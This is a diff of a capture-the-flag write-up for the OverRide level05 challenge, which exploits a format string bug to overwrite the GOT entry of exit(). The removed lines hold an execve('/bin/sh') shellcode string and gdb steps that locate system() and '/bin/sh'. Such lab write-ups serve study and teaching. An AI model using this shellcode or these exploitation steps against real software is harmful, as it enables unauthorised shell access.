@@ -28,9 +28,6 @@ level05@OverRide:~$ readelf -a level05 | grep STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 ```
 ```
-SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-```
-```
 Breakpoint 1, 0x0804847a in main ()
 gdb-peda$ x/25wx 0xffffd698
 0xffffd698:     0x080497e0      0x080497e2      0x90909090      0x90909090
@@ -56,28 +53,6 @@ gdb-peda$ x/25wx 0xffffd698
 The issue is that `printf()` is missuded which expose the application to the Format String Attack.
 
 FSA allows to apply overwrite of GOT table where address of `exit()` is stored.
-
-Determine addresses of `system()` and `"/bin/sh"` as well as where `exit()` is stored.
-```
-gdb-peda$ print system
-$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-gdb-peda$
-gdb-peda$ find "/bin/sh"
-Searching for '/bin/sh' in: None ranges
-Found 1 results, display max 1 items:
-libc : 0xf7f897ec ("/bin/sh")
-gdb-peda$
-gdb-peda$ x/i main+207
-  0x8048513 <main+207>: call 0x8048370 <exit@plt>
-gdb-peda$ disassemble 0x8048370
-Dump of assembler code for function exit@plt:
-  0x08048370 <+0>:  jmp  DWORD PTR ds:0x80497e0
-  0x08048376 <+6>:  push 0x18
-  0x0804837b <+11>: jmp  0x8048330
-End of assembler dump.
-gdb-peda$ x 0x80497e0
-  0x80497e0 <exit@got.plt>: 0x08048376
-```
 
 Input recognizable characters to determine how far away input is layed on the stack.
 
